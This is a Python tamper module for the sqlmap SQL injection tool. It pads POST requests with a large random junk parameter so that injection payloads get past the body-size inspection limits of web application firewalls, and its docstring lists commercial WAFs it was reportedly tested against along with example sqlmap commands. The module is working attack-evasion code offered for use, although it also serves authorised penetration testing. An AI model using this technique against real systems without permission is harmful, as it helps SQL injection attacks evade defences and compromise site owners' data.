#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re
import random
import string

from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.enums import HINT
from lib.core.enums import PRIORITY
from lib.core.settings import DEFAULT_GET_POST_DELIMITER

__priority__ = PRIORITY.LOWEST

DEFAULT_SIZE = 8200
MAX_SIZE = 64 * 1024 * 1024  # 64MB

def _parse_size_to_bytes(value):
    """
    Converts a size string to bytes. Supports: 20M, 300K, 8K, 1G, 16384.
    Suffixes: K (1024), M (1024^2), G (1024^3), case-insensitive.
    Returns None if invalid.
    """
    if not value or not isinstance(value, (str, bytes)):
        return None
    value = value.strip().upper()
    if not value:
        return None
    match = re.match(r'^(\d+)\s*(K|M|G)?$', value)
    if not match:
        return None
    num = int(match.group(1))
    suffix = match.group(2)
    if suffix == 'K':
        num *= 1024
    elif suffix == 'M':
        num *= 1024 * 1024
    elif suffix == 'G':
        num *= 1024 * 1024 * 1024
    return num if num > 0 else None

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Prepends a large junk parameter to bypass WAF body size inspection limits

    Requirement:
        * POST method requests

    Tested against:
        * Cloudflare WAF (free tier ~8KB limit)
        * AWS WAF with ALB (8KB limit)
        * Google Cloud Armor (8KB limit)
        * Azure Front Door (128KB limit)
        * ModSecurity with ProcessPartial
        * Sucuri WAF (1.25MB limit)
        * Fortinet FortiWeb (64MB limit)

    Notes:
        * Many WAFs have a maximum request body size they will inspect
        * Requests exceeding this limit may bypass inspection entirely
        * Default padding is 8200 bytes (covers most common WAF limits)
        * Junk is added at the START of the HTTP body using HINT.PREPEND
        * Size configurable via --tamper-data or SQLMAP_OVERSIZEDREQUEST_SIZE (e.g. 20M, 300K, 8K)

    Reference:
        * https://www.blackhillsinfosec.com/bypassing-wafs-using-oversized-requests/

    Example (custom size):
        python sqlmap.py -r request.req --tamper=oversizedrequest --tamper-data=oversizedrequest.size=20M
        SQLMAP_OVERSIZEDREQUEST_SIZE=20M python sqlmap.py -r request.req --tamper=oversizedrequest

    >>> os.environ['SQLMAP_OVERSIZEDREQUEST_SIZE'] = '8200'
    >>> hints = {}
    >>> tamper('1 AND 1=1', hints=hints)
    '1 AND 1=1'
    >>> len(hints[HINT.PREPEND]) > 8000
    True
    """

    hints = kwargs.get("hints", {})
    delimiter = kwargs.get("delimiter", DEFAULT_GET_POST_DELIMITER)

    # Read size: 1) --tamper-data, 2) SQLMAP_OVERSIZEDREQUEST_SIZE env, 3) default
    tamper_data = kwargs.get("tamperData", {}) or {}
    oversized_data = tamper_data.get("oversizedrequest", {}) or {}
    size_str = oversized_data.get("size")
    if size_str is None:
        size_str = os.environ.get("SQLMAP_OVERSIZEDREQUEST_SIZE", str(DEFAULT_SIZE))
    padding_size = _parse_size_to_bytes(size_str)

    if padding_size is None or padding_size <= 0:
        singleTimeWarnMessage("oversizedrequest: invalid size '%s', using default %d bytes" % (size_str, DEFAULT_SIZE))
        padding_size = DEFAULT_SIZE
    elif padding_size > MAX_SIZE:
        singleTimeWarnMessage("oversizedrequest: size %d exceeds max %d bytes, capping" % (padding_size, MAX_SIZE))
        padding_size = MAX_SIZE

    # Generate random junk data to avoid pattern detection
    junk_chars = string.ascii_letters + string.digits
    junk_data = ''.join(random.choice(junk_chars) for _ in xrange(padding_size))
    
    # Use HINT.PREPEND to add junk at the START of the HTTP body
    # This ensures the WAF sees junk first, potentially exceeding its inspection limit
    hints[HINT.PREPEND] = "junk=%s" % junk_data

    return payload
